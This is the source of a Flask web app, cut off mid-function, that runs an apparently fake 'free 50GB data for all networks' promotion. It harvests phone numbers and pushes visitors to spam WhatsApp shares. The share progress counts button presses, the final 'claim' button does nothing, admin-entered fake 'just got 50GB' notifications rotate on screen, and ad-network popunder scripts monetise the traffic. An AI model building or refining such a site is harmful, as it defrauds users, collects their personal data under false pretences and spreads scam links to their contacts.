import os
import sqlite3
import secrets
from datetime import datetime
from functools import wraps
from urllib.parse import quote

from flask import (
    Flask,
    request,
    redirect,
    url_for,
    session,
    render_template_string,
    send_from_directory,
    flash,
    jsonify
)

from werkzeug.utils import secure_filename


# ============================================================
# APP SETTINGS
# ============================================================

app = Flask(__name__)

app.secret_key = os.environ.get(
    "SECRET_KEY",
    "change-this-secret-key"
)

ADMIN_USERNAME = os.environ.get(
    "ADMIN_USERNAME",
    "admin"
)

ADMIN_PASSWORD = os.environ.get(
    "ADMIN_PASSWORD",
    "JEPHTHAH"
)

SITE_URL = os.environ.get(
    "SITE_URL",
    "https://free-50gb-for-all-network-s.onrender.com"
).rstrip("/")

DATABASE = "promotion.db"

UPLOAD_FOLDER = "uploads"

MAX_CONTENT_LENGTH = 8 * 1024 * 1024

ALLOWED_EXTENSIONS = {
    "jpg",
    "jpeg",
    "png",
    "webp"
}

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH

os.makedirs(UPLOAD_FOLDER, exist_ok=True)


# ============================================================
# DATABASE
# ============================================================

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn


def setup_database():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS campaign (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            heading TEXT NOT NULL,
            message TEXT NOT NULL,
            referral_target INTEGER NOT NULL DEFAULT 20,
            image TEXT
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS participants (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT NOT NULL UNIQUE,
            referral_code TEXT NOT NULL UNIQUE,
            referred_by TEXT,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS share_clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referral_code TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS credited_numbers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            masked_phone TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    existing_campaign = conn.execute(
        "SELECT id FROM campaign LIMIT 1"
    ).fetchone()

    if not existing_campaign:
        conn.execute("""
            INSERT INTO campaign
            (heading, message, referral_target, image)
            VALUES (?, ?, ?, ?)
        """, (
            "FREE 50GB FOR ALL NETWORK'S",
            "🎁 Take part in our promotional offer and follow the steps below to claim your 50GB offer.",
            20,
            None
        ))

    conn.commit()
    conn.close()


# ============================================================
# CAMPAIGN
# ============================================================

def get_campaign():
    conn = get_db()

    campaign = conn.execute(
        "SELECT * FROM campaign ORDER BY id ASC LIMIT 1"
    ).fetchone()

    conn.close()

    return campaign


# ============================================================
# HELPERS
# ============================================================

def allowed_file(filename):
    return (
        "." in filename
        and filename.rsplit(".", 1)[1].lower()
        in ALLOWED_EXTENSIONS
    )


def mask_phone(phone):
    """
    Store/display only a masked version publicly.

    Example:
    08031234567 -> 0803****567
    """

    digits = "".join(
        character
        for character in phone
        if character.isdigit()
    )

    if len(digits) <= 7:
        return "*" * len(digits)

    return digits[:4] + "****" + digits[-3:]


def get_referral_count(code):
    conn = get_db()

    result = conn.execute(
        """
        SELECT COUNT(*) AS total
        FROM share_clicks
        WHERE referral_code = ?
        """,
        (code,)
    ).fetchone()

    conn.close()

    return result["total"]


def get_registration_count(code):
    conn = get_db()

    result = conn.execute(
        """
        SELECT COUNT(*) AS total
        FROM participants
        WHERE referred_by = ?
        """,
        (code,)
    ).fetchone()

    conn.close()

    return result["total"]


def admin_required(function):
    @wraps(function)
    def decorated_function(*args, **kwargs):

        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))

        return function(*args, **kwargs)

    return decorated_function


# ============================================================
# PUBLIC HOME PAGE
# ============================================================

@app.route("/")
def home():

    campaign = get_campaign()

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- SOCIAL MEDIA PREVIEW METADATA -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="🎁 Claim Your 50GB Data Offer | All Networks">
    <meta property="og:description" content="Explore the advertised 50GB data offer and find out how to claim it, including participating networks and eligibility. Availability depends on the actual promotion.">
    <meta property="og:image" content="https://free-50gb-for-all-network-s.onrender.com/uploads/banner.jpg">
    <meta property="og:image:alt" content="Banner for the 50GB data promotion">
    <meta property="og:url" content="{{ request.url }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="🎁 Claim Your 50GB Data Offer | All Networks">
    <meta name="twitter:description" content="Explore the advertised 50GB data offer and find out how to claim it. Availability depends on the actual promotion.">
    <meta name="twitter:image" content="https://free-50gb-for-all-network-s.onrender.com/uploads/banner.jpg">
    <!-- END SOCIAL MEDIA PREVIEW METADATA -->

    <meta name="monetag" content="8270a4c02d3fa8c6094bc68970d0fc47">

    <title>{{ campaign['heading'] }}</title>

    <script src="https://quge5.com/88/tag.min.js" data-zone="292606" async data-cfasync="false"></script>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f0f4f8;
            color: #222;
        }

        .container {
            max-width: 600px;
            margin: auto;
            min-height: 100vh;
            background: white;
        }

        .banner {
            width: 100%;
            background: #111;
        }

        .banner img {
            width: 100%;
            display: block;
            max-height: 430px;
            object-fit: cover;
        }

        .content {
            padding: 24px 18px;
        }

        h1 {
            text-align: center;
            margin-top: 0;
        }

        .message {
            text-align: center;
            line-height: 1.6;
        }

        .offer {
            margin-top: 20px;
            padding: 20px;
            border-radius: 14px;
            background: #e8f7ff;
            text-align: center;
        }

        .offer h2 {
            margin-top: 0;
        }

        input {
            width: 100%;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 15px;
            margin-top: 12px;
            border: none;
            border-radius: 10px;
            background: #0077b6;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .small {
            text-align: center;
            color: #777;
            font-size: 13px;
            margin-top: 15px;
        }

        .credit-notification {
            position: fixed;
            left: 50%;
            bottom: 20px;
            transform: translateX(-50%);
            width: calc(100% - 30px);
            max-width: 520px;
            background: #111;
            color: white;
            padding: 14px 45px 14px 16px;
            border-radius: 12px;
            box-shadow: 0 5px 25px rgba(0,0,0,.25);
            display: none;
            z-index: 9999;
            font-size: 14px;
        }

        .credit-notification button {
            position: absolute;
            right: 8px;
            top: 4px;
            width: auto;
            margin: 0;
            padding: 5px 9px;
            background: transparent;
            color: white;
            font-size: 18px;
        }

        footer {
            text-align: center;
            padding: 25px 10px;
            font-size: 13px;
            color: #777;
        }

        footer a {
            color: #0077b6;
            text-decoration: none;
            margin: 0 7px;
        }

    </style>

</head>

<body>

<div class="container">

    {% if campaign['image'] %}

    <div class="banner">
        <img
            src="{{ url_for(
                'uploaded_file',
                filename=campaign['image']
            ) }}"
            alt="Promotion"
        >
    </div>

    {% endif %}

    <div class="content">

        <h1>{{ campaign['heading'] }}</h1>

        <div class="message">
            {{ campaign['message'] }}
        </div>

        <div class="offer">

            <h2>🎁 Claim Your 50GB</h2>

            <p>
                Enter your phone number below to continue.
            </p>

        </div>

        <form method="POST" action="{{ url_for('claim') }}">

            <input
                type="text"
                name="phone"
                placeholder="Enter your phone number"
                required
            >

            <button type="submit">
                CONTINUE
            </button>

        </form>

        <div class="small">
            Follow the steps to continue with the promotion.
        </div>

    </div>

    <footer>

        <a href="{{ url_for('privacy') }}">
            Privacy Policy
        </a>

        |

        <a href="{{ url_for('terms') }}">
            Terms
        </a>

    </footer>

</div>


<div
    id="creditNotification"
    class="credit-notification"
>

    <span id="creditText"></span>

    <button
        type="button"
        onclick="closeCreditNotification()"
    >
        ×
    </button>

</div>


<script>

let creditedNumbers = [];
let currentCreditIndex = 0;
let creditTimer = null;


async function loadCreditedNumbers() {

    try {

        const response = await fetch(
            "{{ url_for('api_credited_numbers') }}"
        );

        const data = await response.json();

        creditedNumbers = data.numbers || [];

        if (creditedNumbers.length > 0) {

            showNextCredit();

            if (!creditTimer) {

                creditTimer = setInterval(
                    showNextCredit,
                    4000
                );

            }

        }

    } catch (error) {

        console.log("Notification loading error");

    }

}


function showNextCredit() {

    if (creditedNumbers.length === 0) {
        return;
    }

    const number =
        creditedNumbers[
            currentCreditIndex %
            creditedNumbers.length
        ];

    document.getElementById(
        "creditText"
    ).textContent =
        number + " just got 50GB 🎉";

    document.getElementById(
        "creditNotification"
    ).style.display = "block";

    currentCreditIndex++;

}


function closeCreditNotification() {

    document.getElementById(
        "creditNotification"
    ).style.display = "none";

}


loadCreditedNumbers();

</script>

</body>
</html>
""", campaign=campaign)


# ============================================================
# CLAIM / NORMAL REGISTRATION
# ============================================================

@app.route("/claim", methods=["POST"])
def claim():

    phone = request.form.get(
        "phone",
        ""
    ).strip()

    if not phone:
        return redirect(url_for("home"))

    conn = get_db()

    existing = conn.execute(
        """
        SELECT referral_code
        FROM participants
        WHERE phone = ?
        """,
        (phone,)
    ).fetchone()

    conn.close()

    if existing:

        return redirect(
            url_for(
                "invite",
                code=existing["referral_code"]
            )
        )

    referral_code = secrets.token_urlsafe(8)

    conn = get_db()

    conn.execute("""
        INSERT INTO participants
        (
            phone,
            referral_code,
            referred_by,
            created_at
        )
        VALUES (?, ?, ?, ?)
    """, (
        phone,
        referral_code,
        None,
        datetime.utcnow().isoformat()
    ))

    conn.commit()
    conn.close()

    return redirect(
        url_for(
            "invite",
            code=referral_code
        )
    )


# ============================================================
# REFERRAL LANDING PAGE
# ============================================================

@app.route("/join/<referrer>")
def join_referral(referrer):

    conn = get_db()

    referrer_user = conn.execute(
        """
        SELECT id
        FROM participants
        WHERE referral_code = ?
        """,
        (referrer,)
    ).fetchone()

    conn.close()

    if not referrer_user:
        return redirect(url_for("home"))

    campaign = get_campaign()

    # IMPORTANT:
    # This page deliberately uses the same visual promotion
    # as the normal home page.
    #
    # The visitor does NOT see a special referral page.
    #
    # The referrer code is simply kept hidden in the form.

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <!-- SOCIAL MEDIA PREVIEW METADATA -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="🎁 Claim Your 50GB Data Offer | All Networks">
    <meta property="og:description" content="Explore the advertised 50GB data offer and find out how to claim it, including participating networks and eligibility. Availability depends on the actual promotion.">
    <meta property="og:image" content="https://free-50gb-for-all-network-s.onrender.com/uploads/banner.jpg">
    <meta property="og:image:alt" content="Banner for the 50GB data promotion">
    <meta property="og:url" content="{{ request.url }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="🎁 Claim Your 50GB Data Offer | All Networks">
    <meta name="twitter:description" content="Explore the advertised 50GB data offer and find out how to claim it. Availability depends on the actual promotion.">
    <meta name="twitter:image" content="https://free-50gb-for-all-network-s.onrender.com/uploads/banner.jpg">
    <!-- END SOCIAL MEDIA PREVIEW METADATA -->

    <title>{{ campaign['heading'] }}</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f0f4f8;
            color: #222;
        }

        .container {
            max-width: 600px;
            margin: auto;
            min-height: 100vh;
            background: white;
        }

        .banner {
            width: 100%;
            background: #111;
        }

        .banner img {
            width: 100%;
            display: block;
            max-height: 430px;
            object-fit: cover;
        }

        .content {
            padding: 24px 18px;
        }

        h1 {
            text-align: center;
            margin-top: 0;
        }

        .message {
            text-align: center;
            line-height: 1.6;
        }

        .offer {
            margin-top: 20px;
            padding: 20px;
            border-radius: 14px;
            background: #e8f7ff;
            text-align: center;
        }

        .offer h2 {
            margin-top: 0;
        }

        input {
            width: 100%;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 15px;
            margin-top: 12px;
            border: none;
            border-radius: 10px;
            background: #0077b6;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .small {
            text-align: center;
            color: #777;
            font-size: 13px;
            margin-top: 15px;
        }

    </style>

</head>

<body>

<div class="container">

    {% if campaign['image'] %}

    <div class="banner">

        <img
            src="{{ url_for(
                'uploaded_file',
                filename=campaign['image']
            ) }}"
            alt="Promotion"
        >

    </div>

    {% endif %}

    <div class="content">

        <h1>{{ campaign['heading'] }}</h1>

        <div class="message">
            {{ campaign['message'] }}
        </div>

        <div class="offer">

            <h2>🎁 Claim Your 50GB</h2>

            <p>
                Enter your phone number below to continue.
            </p>

        </div>

        <form
            method="POST"
            action="{{ url_for('register_referral') }}"
        >

            <input
                type="text"
                name="phone"
                placeholder="Enter your phone number"
                required
            >

            <!-- Referral code is hidden -->
            <input
                type="hidden"
                name="referrer"
                value="{{ referrer }}"
            >

            <button type="submit" onclick="window.open('https://uplcm.com/4/11985707', '_blank')" style="background:#00c853; color:white; padding:15px 30px; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; width:100%;">
  CONTINUE TO UNLOCK 🔓
</button>

        </form>

        <div class="small">
            Follow the steps to continue with the promotion.
        </div>

    </div>

</div>

</body>
</html>
""",
    campaign=campaign,
    referrer=referrer
)


# ============================================================
# REGISTER A REFERRED PERSON
# ============================================================

@app.route("/register-referral", methods=["POST"])
def register_referral():

    phone = request.form.get(
        "phone",
        ""
    ).strip()

    referrer = request.form.get(
        "referrer",
        ""
    ).strip()

    if not phone:
        return redirect(url_for("home"))

    conn = get_db()

    # If this phone already exists, send the person
    # to their existing personal page.

    existing = conn.execute(
        """
        SELECT referral_code
        FROM participants
        WHERE phone = ?
        """,
        (phone,)
    ).fetchone()

    if existing:

        conn.close()

        return redirect(
            url_for(
                "invite",
                code=existing["referral_code"]
            )
        )

    # Verify the referral code.

    referrer_user = conn.execute(
        """
        SELECT id
        FROM participants
        WHERE referral_code = ?
        """,
        (referrer,)
    ).fetchone()

    if not referrer_user:

        conn.close()

        return redirect(
            url_for("home")
        )

    new_referral_code = secrets.token_urlsafe(8)

    conn.execute("""
        INSERT INTO participants
        (
            phone,
            referral_code,
            referred_by,
            created_at
        )
        VALUES (?, ?, ?, ?)
    """, (
        phone,
        new_referral_code,
        referrer,
        datetime.utcnow().isoformat()
    ))

    conn.commit()
    conn.close()

    return redirect(
        url_for(
            "invite",
            code=new_referral_code
        )
    )


# ============================================================
# PERSONAL REFERRAL / SHARE PAGE
# ============================================================

@app.route("/invite/<code>")
def invite(code):

    conn = get_db()

    participant = conn.execute(
        """
        SELECT *
        FROM participants
        WHERE referral_code = ?
        """,
        (code,)
    ).fetchone()

    conn.close()

    if not participant:
        return redirect(url_for("home"))

    campaign = get_campaign()

    count = get_referral_count(code)

    target = int(
        campaign["referral_target"] or 20
    )

    if count > target:
        count = target

    reached = count >= target

    share_link = (
        SITE_URL
        + url_for(
            "join_referral",
            referrer=code
        )
    )

    whatsapp_message = (
        "🎁 Claim your 50GB!\n\n"
        "Share this offer with your friends:\n"
        + share_link
    )

    whatsapp_url = (
        "https://wa.me/?text="
        + quote(whatsapp_message)
    )

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <!-- SOCIAL MEDIA PREVIEW METADATA -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="🎁 Claim Your 50GB Data Offer | All Networks">
    <meta property="og:description" content="Explore the advertised 50GB data offer and find out how to claim it, including participating networks and eligibility. Availability depends on the actual promotion.">
    <meta property="og:image" content="https://free-50gb-for-all-network-s.onrender.com/uploads/banner.jpg">
    <meta property="og:image:alt" content="Banner for the 50GB data promotion">
    <meta property="og:url" content="{{ request.url }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="🎁 Claim Your 50GB Data Offer | All Networks">
    <meta name="twitter:description" content="Explore the advertised 50GB data offer and find out how to claim it. Availability depends on the actual promotion.">
    <meta name="twitter:image" content="https://free-50gb-for-all-network-s.onrender.com/uploads/banner.jpg">
    <!-- END SOCIAL MEDIA PREVIEW METADATA -->

    <title>Claim Your 50GB</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f0f4f8;
            color: #222;
        }

        .container {
            max-width: 600px;
            margin: auto;
            min-height: 100vh;
            background: white;
            padding: 25px 18px;
        }

        .card {
            background: white;
            border-radius: 16px;
            padding: 22px;
            box-shadow: 0 4px 18px rgba(0,0,0,.08);
        }

        h1 {
            text-align: center;
            margin-top: 0;
        }

        .offer-title {
            text-align: center;
            font-size: 25px;
            font-weight: bold;
            margin: 15px 0;
        }
        

        .progress-text {
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            margin: 20px 0;
        }

        .progress {
            width: 100%;
            height: 16px;
            background: #ddd;
            border-radius: 20px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            background: #0077b6;
            width: {{ percentage }}%;
        }

        .message {
            text-align: center;
            line-height: 1.6;
            margin: 20px 0;
        }

        .share-button {
            display: block;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            background: #25D366;
            color: white;
            text-decoration: none;
            text-align: center;
            font-weight: bold;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }

        .claim-button {
            display: block;
            width: 100%;
            padding: 17px;
            border-radius: 10px;
            background: #0077b6;
            color: white;
            text-align: center;
            font-weight: bold;
            font-size: 17px;
            border: none;
            cursor: pointer;
        }

        .claim-ready {
            text-align: center;
            padding: 15px;
            background: #e8f7ff;
            border-radius: 12px;
            margin-bottom: 18px;
            line-height: 1.5;
        }

        .back {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #0077b6;
            text-decoration: none;
        }

        .note {
            text-align: center;
            color: #777;
            font-size: 13px;
            margin-top: 15px;
            line-height: 1.5;
        }

    </style>

</head>

<body>

<div class="container">

    <div class="card">

        {% if reached %}

            <div class="offer-title">
                🎉 Claim Your 50GB Offer
            </div>

            <div class="claim-ready">

                You have reached {{ target }}/{{ target }}
                shares.

                <br><br>

                Your 50GB offer is now ready to be claimed.

            </div>

            <!--
                IMPORTANT:
                This button does NOT open WhatsApp.
                It is simply present on the page at 20/20.
            -->

            <button
                type="button"
                class="claim-button"
            >
                CLAIM YOUR 50GB OFFER
            </button>

        {% else %}

            <h1>
                Claim Your 50GB
            </h1>

            <div class="offer-title">
                🎁 Share to claim your 50GB
            </div>

            <div class="progress-text">
                {{ count }} / {{ target }}
            </div>

            <div class="progress">

                <div
                    class="progress-bar"
                    style="width: {{ percentage }}%;"
                ></div>

            </div>

            <div class="message">

                Share this offer to reach
                {{ target }} shares and unlock
                your 50GB offer.

            </div>

            <a
                href="{{ whatsapp_url }}"
                class="share-button"
                id="shareButton"
            >
                SHARE TO CLAIM YOUR 50GB
            </a>

            <div class="note">

                Each time you press the share button,
                your share count increases by 1.

            </div>

        {% endif %}

        <a
            href="{{ url_for('home') }}"
            class="back"
        >
            BACK TO OFFER
        </a>

    </div>

</div>


{% if not reached %}

<script>

let alreadyRecorded = false;

document
    .getElementById("shareButton")
    .addEventListener("click", async function(event) {

        if (alreadyRecorded) {
            return;
        }

        alreadyRecorded = true;

        try {

            await fetch(
                "{{ url_for(
                    'record_share',
                    code=code
                ) }}",
                {
                    method: "POST",
                    headers: {
                        "Content-Type":
                            "application/json"
                    }
                }
            );

        } catch (error) {

            console.log(
                "Share count error",
                error
            );

        }

    });

</script>

{% endif %}

</body>
</html>
""",
        code=code,
        campaign=campaign,
        count=count,
        target=target,
        reached=reached,
        percentage=min(
            100,
            int((count / target) * 100)
            if target > 0 else 0
        ),
        whatsapp_url=whatsapp_url
    )


# ============================================================
# RECORD SHARE CLICK
# ============================================================

@app.route(
    "/record-share/<code>",
    methods=["POST"]
)
def record_share(code):

    conn = get_db()

    participant = conn.execute(
        """
        SELECT id
        FROM participants
        WHERE referral_code = ?
        """,
        (code,)
    ).fetchone()

    if not participant:

        conn.close()

        return jsonify({
            "success": False
        }), 404

    campaign = conn.execute(
        """
        SELECT referral_target
        FROM campaign
        ORDER BY id ASC
        LIMIT 1
        """
    ).fetchone()

    target = int(
        campaign["referral_target"] or 20
    )

    current_count = conn.execute(
        """
        SELECT COUNT(*) AS total
        FROM share_clicks
        WHERE referral_code = ?
        """,
        (code,)
    ).fetchone()["total"]

    # Do not allow the counter to go beyond the target.

    if current_count < target:

        conn.execute("""
            INSERT INTO share_clicks
            (
                referral_code,
                created_at
            )
            VALUES (?, ?)
        """, (
            code,
            datetime.utcnow().isoformat()
        ))

        conn.commit()

    conn.close()

    return jsonify({
        "success": True
    })


# ============================================================
# UPLOADED IMAGE
# ============================================================

@app.route("/uploads/<filename>")
def uploaded_file(filename):

    return send_from_directory(
        app.config["UPLOAD_FOLDER"],
        filename
    )


# ============================================================
# PUBLIC CREDITED NUMBER API
# ============================================================

@app.route("/api/credited-numbers")
def api_credited_numbers():

    conn = get_db()

    rows = conn.execute(
        """
        SELECT masked_phone
        FROM credited_numbers
        ORDER BY id DESC
        """
    ).fetchall()

    conn.close()

    return jsonify({
        "numbers": [
            row["masked_phone"]
            for row in rows
        ]
    })


# ============================================================
# ADMIN LOGIN
# ============================================================

@app.route(
    "/secret-admin",
    methods=["GET", "POST"]
)
def admin_login():

    if request.method == "POST":

        username = request.form.get(
            "username",
            ""
        ).strip()

        password = request.form.get(
            "password",
            ""
        )

        if (
            username == ADMIN_USERNAME
            and password == ADMIN_PASSWORD
        ):

            session["admin_logged_in"] = True

            return redirect(
                url_for("admin_dashboard")
            )

        flash("Invalid login details.")

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Admin Login</title>

    <style>

        body {
            margin: 0;
            background: #f0f4f8;
            font-family: Arial, sans-serif;
        }

        .box {
            max-width: 420px;
            margin: 80px auto;
            background: white;
            padding: 25px;
            border-radius: 15px;
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #0077b6;
            color: white;
            border: 0;
            border-radius: 8px;
            font-weight: bold;
        }

    </style>

</head>

<body>

<div class="box">

    <h2>Admin Login</h2>

    {% with messages = get_flashed_messages() %}

        {% for message in messages %}

            <p>{{ message }}</p>

        {% endfor %}

    {% endwith %}

    <form method="POST">

        <input
            type="text"
            name="username"
            placeholder="Username"
            required
        >

        <input
            type="password"
            name="password"
            placeholder="Password"
            required
        >

        <button type="submit">
            LOGIN
        </button>

    </form>

</div>

</body>
</html>
""")


# ============================================================
# ADMIN DASHBOARD
# ============================================================

@app.route("/secret-admin/dashboard")
@admin_required
def admin_dashboard():

    conn = get_db()

    total_users = conn.execute(
        "SELECT COUNT(*) AS total FROM participants"
    ).fetchone()["total"]

    total_shares = conn.execute(
        "SELECT COUNT(*) AS total FROM share_clicks"
    ).fetchone()["total"]

    total_credited = conn.execute(
        "SELECT COUNT(*) AS total FROM credited_numbers"
    ).fetchone()["total"]

    recent_participants = conn.execute("""
        SELECT
            phone,
            referral_code,
            referred_by,
            created_at
        FROM participants
        ORDER BY id DESC
        LIMIT 30
    """).fetchall()

    conn.close()

    campaign = get_campaign()

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Admin Dashboard</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            background: #f0f4f8;
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 1100px;
            margin: auto;
            padding: 20px;
        }

        .cards {
            display: grid;
            grid-template-columns:
                repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
        }

        .card {
            background: white;
            padding: 20px;
            border-radius: 12px;
        }

        .number {
            font-size: 30px;
            font-weight: bold;
        }

        .actions {
            margin: 20px 0;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }

        .actions a {
            background: #0077b6;
            color: white;
            padding: 12px 15px;
            border-radius: 8px;
            text-decoration: none;
        }

        .danger {
            background: #c1121f !important;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
        }

        th,
        td {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            text-align: left;
        }

        .table-wrap {
            overflow-x: auto;
        }

    </style>

</head>

<body>

<div class="container">

    <h1>Admin Dashboard</h1>

    <div class="cards">

        <div class="card">

            <div>Total Users</div>

            <div class="number">
                {{ total_users }}
            </div>

        </div>

        <div class="card">

            <div>Total Share Clicks</div>

            <div class="number">
                {{ total_shares }}
            </div>

        </div>

        <div class="card">

            <div>Credited Numbers</div>

            <div class="number">
                {{ total_credited }}
            </div>

        </div>

    </div>


    <div class="actions">

        <a href="{{ url_for('admin_edit') }}">
            Edit Campaign
        </a>

        <a href="{{ url_for('admin_credited_numbers') }}">
            Manage Credited Numbers
        </a>

        <a href="{{ url_for('home') }}">
            View Promotion
        </a>

        <a
            href="{{ url_for('admin_logout') }}"
            class="danger"
        >
            Logout
        </a>

    </div>


    <div class="card">

        <h2>Current Campaign</h2>

        <p>
            <strong>Heading:</strong>
            {{ campaign['heading'] }}
        </p>

        <p>
            <strong>Referral Target:</strong>
            {{ campaign['referral_target'] }}
        </p>

        <p>
            <strong>Image:</strong>
            {{ campaign['image'] or 'No image uploaded' }}
        </p>

    </div>


    <br>


    <div class="card">

        <h2>Recent Participants</h2>

        <div class="table-wrap">

            <table>

                <tr>

                    <th>Phone</th>
                    <th>Referral Code</th>
                    <th>Referred By</th>
                    <th>Date</th>

                </tr>

                {% for person in recent_participants %}

                <tr>

                    <td>
                        {{ person['phone'] }}
                    </td>

                    <td>
                        {{ person['referral_code'] }}
                    </td>

                    <td>
                        {{ person['referred_by'] or '-' }}
                    </td>

                    <td>
                        {{ person['created_at'] }}
                    </td>

                </tr>

                {% endfor %}

            </table>

        </div>

    </div>

</div>

</body>
</html>
""",
        total_users=total_users,
        total_shares=total_shares,
        total_credited=total_credited,
        campaign=campaign,
        recent_participants=recent_participants
    )


# ============================================================
# ADMIN CAMPAIGN EDITOR
# ============================================================

@app.route(
    "/secret-admin/edit",
    methods=["GET", "POST"]
)
@admin_required
def admin_edit():

    campaign = get_campaign()

    if request.method == "POST":

        heading = request.form.get(
            "heading",
            ""
        ).strip()

        message = request.form.get(
            "message",
            ""
        ).strip()

        referral_target = request.form.get(
            "referral_target",
            "20"
        ).strip()

        try:
            referral_target = int(
                referral_target
            )

            if referral_target < 1:
                referral_target = 20

        except ValueError:

            referral_target = 20

        image_name = campaign["image"]

        image = request.files.get(
            "image"
        )

        if image and image.filename:

            if allowed_file(image.filename):

                filename = secure_filename(
                    image.filename
                )

                filename = (
                    secrets.token_hex(8)
                    + "_"
                    + filename
                )

                image.save(
                    os.path.join(
                        app.config["UPLOAD_FOLDER"],
                        filename
                    )
                )

                image_name = filename

        conn = get_db()

        conn.execute("""
            UPDATE campaign
            SET
                heading = ?,
                message = ?,
                referral_target = ?,
                image = ?
            WHERE id = ?
        """, (
            heading,
            message,
            referral_target,
            image_name,
            campaign["id"]
        ))

        conn.commit()
        conn.close()

        flash("Campaign updated successfully.")

        return redirect(
            url_for("admin_dashboard")
        )

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Edit Campaign</title>

    <style>

        body {
            margin: 0;
            background: #f0f4f8;
            font-family: Arial, sans-serif;
        }

        .box {
            max-width: 700px;
            margin: 30px auto;
            background: white;
            padding: 25px;
            border-radius: 15px;
        }

        input,
        textarea {
            width: 100%;
            box-sizing: border-box;
            padding: 13px;
            margin: 8px 0 18px;
        }

        textarea {
            min-height: 150px;
        }

        button {
            width: 100%;
            padding: 14px;
            border: 0;
            border-radius: 8px;
            background: #0077b6;
            color: white;
            font-weight: bold;
        }

        a {
            display: block;
            text-align: center;
            margin-top: 15px;
            color: #0077b6;
        }

    </style>

</head>

<body>

<div class="box">

    <h1>Edit Campaign</h1>

    {% with messages = get_flashed_messages() %}

        {% for message in messages %}

            <p>{{ message }}</p>

        {% endfor %}

    {% endwith %}

    <form
        method="POST"
        enctype="multipart/form-data"
    >

        <label>
            Heading
        </label>

        <input
            type="text"
            name="heading"
            value="{{ campaign['heading'] }}"
            required
        >

        <label>
            Message
        </label>

        <textarea
            name="message"
            required
        >{{ campaign['message'] }}</textarea>

        <label>
            Referral Target
        </label>

        <input
            type="number"
            name="referral_target"
            value="{{ campaign['referral_target'] }}"
            min="1"
            required
        >

        <label>
            Promotion Image
        </label>

        <input
            type="file"
            name="image"
            accept=".jpg,.jpeg,.png,.webp"
        >

        <button type="submit">
            SAVE CAMPAIGN
        </button>

    </form>

    <a href="{{ url_for('admin_dashboard') }}">
        Back to Dashboard
    </a>

</div>

</body>
</html>
""",
        campaign=campaign
    )


# ============================================================
# ADMIN: CREDITED NUMBERS
# ============================================================

@app.route(
    "/secret-admin/credited-numbers",
    methods=["GET", "POST"]
)
@admin_required
def admin_credited_numbers():

    if request.method == "POST":

        raw_numbers = request.form.get(
            "numbers",
            ""
        )

        # Accept one number per line,
        # or numbers separated by commas.

        raw_numbers = raw_numbers.replace(
            ",",
            "\n"
        )

        numbers = [
            item.strip()
            for item in raw_numbers.splitlines()
            if item.strip()
        ]

        conn = get_db()

        for phone in numbers:

            masked = mask_phone(phone)

            if not masked:
                continue

            conn.execute("""
